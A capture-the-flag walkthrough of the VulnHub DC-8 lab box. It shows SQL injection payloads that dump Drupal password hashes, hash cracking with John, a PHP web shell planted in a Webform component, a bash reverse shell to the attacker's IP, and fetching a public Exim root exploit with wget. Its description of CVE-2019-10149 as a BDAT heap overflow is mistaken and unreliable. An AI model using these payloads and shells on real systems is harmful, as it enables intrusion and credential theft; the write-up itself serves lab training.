# DC-8 (VulnHub) Walkthrough

**Target:** DC-8 (10.0.2.11, DHCP-assigned on NAT Network — reconfirmed via `sudo nmap -sn 10.0.2.0/24`)
**Attacker:** Kali Linux (10.0.2.3)

## Recon

Ping sweep to find the current IP:

```
sudo nmap -sn 10.0.2.0/24
```

DC-8 was up at 10.0.2.11. Full port scan:

```
nmap -sC -sV -p- dc-8
```

Two ports: `22/tcp` (OpenSSH) and `80/tcp` (Apache). The `http-generator` meta tag fingerprinted the site as Drupal 7 straight away. `robots.txt` had the standard 36 Drupal disallow entries — nothing extra. The homepage listed three nodes: Home, Who We Are (filler text), and Contact Us. Checking `node/3`'s source showed it's actually a **Webform**, and its CSS imports confirmed the Views, CTools, Site Messages, and Webform contributed modules were active. Confirming the exact version:

```
curl -s http://dc-8/CHANGELOG.txt | head -5
```

Drupal 7.67 — recent enough to rule out Drupageddon (CVE-2014-3704, which only affects core below 7.32), so this box's hole had to be somewhere else.

## Finding the SQL Injection

The sidebar "Details" block links to the three nodes via `/?nid=1`, `/?nid=2`, `/?nid=3` — a custom, non-core way of loading a node by ID that's exactly the kind of thing that skips Drupal's own sanitisation. A single-quote probe confirmed it:

```
curl -s "http://dc-8/?nid=1'" | grep -i "error\|warning\|sql"
```

A PDOException came back revealing the raw query: `SELECT title FROM node WHERE nid = 1`. Numeric context, no quotes needed around the injected value — a clean injection point.

## Exploiting the SQLi

Confirmed UNION control with a version probe:

```
curl -s "http://dc-8/?nid=0+UNION+SELECT+version()--+-"
```

`version()` came back as `10.1.26-MariaDB-0+deb9u1`, rendered through Drupal's own `drupal_set_message()` as a status banner rather than in the page title — the query only has one selectable column (`title`), so the UNION has to match that.

Dumped the admin credential first, since `uid=1` is always the first account created in Drupal:

```
curl -s "http://dc-8/?nid=0+UNION+SELECT+CONCAT(name,0x3a,pass)+FROM+users+WHERE+uid=1--+-"
```

Got `admin:$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z` — Drupal 7's phpass-based `$S$` format (iterated SHA-512), deliberately strong enough that rockyou alone wouldn't touch it. Rather than fight that, I pulled the whole `users` table using `GROUP_CONCAT` to fold every row into the single injectable column:

```
curl -s "http://dc-8/?nid=0+UNION+SELECT+GROUP_CONCAT(name,0x3a,pass,0x0a)+FROM+users--+-"
```

A second account showed up: `john:$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF`.

## Cracking the Second Account

```
echo 'john:$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF' > hash2.txt
john --format=Drupal7 --wordlist=/usr/share/wordlists/rockyou.txt hash2.txt
```

`--format=Drupal7` matters — John doesn't reliably auto-detect the `$S$` phpass variant. Cracked: **john / turtle**.

## Logging In and Finding a Live RCE Vector

Logged into `http://dc-8/user/login` as `john`. The admin toolbar unexpectedly showed Content, Structure, and Configuration — broader than a typical authenticated user — though `/admin/modules` itself still came back Access Denied, so `john`'s permissions are generous but not full admin.

**First attempt (ruled out):** creating a Basic Page showed no Text Format selector under the body field at all — meaning only one input format is bound to this role, and it wasn't PHP code. A test payload saved there rendered as inert literal text.

**Second attempt (ruled out):** the Contact Us webform's **Form settings → Confirmation message** field did expose a "PHP code" text format option. A test payload saved successfully (confirmed via a fresh save banner and a brand-new submission ID each time), but repeated checks of `/node/3/done?sid=N` never executed it — this channel just doesn't render through the PHP filter on this build. Worth remembering as a red herring for exam time: a format being *offered* doesn't mean that field actually executes it.

**Found it:** under **Webform → Form components**, adding a new component of type **Markup**, with text format set to **PHP code** and "Display on" left at *form only*, renders directly inline on the Contact Us node (`/node/3`) itself — on every page load, no submission required at all.

```
Component value: <?php echo "TESTOUTPUT123"; ?>
```

Loading `http://dc-8/node/3` plainly showed `TESTOUTPUT123` on the page — genuine server-side PHP execution confirmed.

## Exploitation — RCE to Reverse Shell

Switched the component to a tiny web shell to confirm command execution first:

```
<?php passthru($_GET['cmd']); ?>
```

```
curl -s "http://dc-8/node/3?cmd=id"
```

Came back `uid=33(www-data) gid=33(www-data) groups=33(www-data)` — RCE confirmed.

Started a listener, then delivered a reverse shell via `curl`'s `--data-urlencode` rather than a manually-typed browser URL (which had mangled the special characters in the bash command on an earlier attempt):

```
nc -lvnp 4444
```

```
curl -s "http://dc-8/node/3" --get --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.0.2.3/4444 0>&1'"
```

Caught the shell as `www-data`. Upgraded the TTY:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Privilege Escalation — Exim 4.89 Local Root (CVE-2019-10149)

```
exim --version
```

Exim 4.89 — squarely inside the 4.87–4.91 range vulnerable to CVE-2019-10149, a heap-based buffer overflow in Exim's BDAT/local-delivery command handling. Because Exim processes local mail delivery with elevated privileges, a successful trigger leads to code execution as root.

On Kali, found and grabbed the public PoC:

```
searchsploit exim
searchsploit -m linux/local/46996.sh
```

`46996.sh` — "Exim 4.87 - 4.91 - Local Privilege Escalation" (raptor_exim_wiz, by Marco Ivaldi). Hosted it and pulled it onto the target:

```
python3 -m http.server 8096
```

```
wget http://10.0.2.3:8096/46996.sh -O /tmp/46996.sh
```

Ran it:

```
chmod +x /tmp/46996.sh && /tmp/46996.sh -m netcat
```

The script sends a crafted message through Exim's local SMTP listener to trigger the BDAT heap overflow, then spawns a root-owned netcat listener on `127.0.0.1:31337`. The exploit script connects to it automatically:

```
id
```

`uid=0(root) gid=113(Debian-exim) groups=113(Debian-exim)` — root.

## Capturing the Flag

```
find / -iname '*flag*' 2>/dev/null
cat /root/flag.txt
```

"Brilliant - you have succeeded!!!" ASCII-art congratulatory message. Root confirmed, flag captured.

## Summary

| Stage | Technique |
|---|---|
| Recon | Full-port Nmap scan — Drupal 7.67 fingerprinted via `http-generator` and CHANGELOG.txt |
| Finding the Vulnerability | Custom "Details" sidebar block injects the `nid` GET parameter directly into SQL — confirmed via a single-quote PDOException |
| Exploiting the SQLi | UNION-based injection (single reflected column via `drupal_set_message`) → dumped admin hash (uncrackable) and the full `users` table via `GROUP_CONCAT` |
| Credential Attack | Cracked secondary user `john` (`$S$` Drupal7 phpass hash) with John, `--format=Drupal7`, rockyou → `john:turtle` |
| Finding the RCE Vector | Ruled out Basic Page body format and Webform confirmation-message format; found a live PHP-execution path via a Webform **Markup** component rendering inline on every `/node/3` load |
| Exploitation | `passthru($_GET['cmd'])` web shell → confirmed RCE as `www-data` → `curl --data-urlencode` delivered a working reverse shell |
| Privilege Escalation | Identified Exim 4.89 (CVE-2019-10149) → public PoC `46996.sh` → BDAT heap overflow → root via local netcat callback |
| Capturing the Flag | `cat /root/flag.txt` |
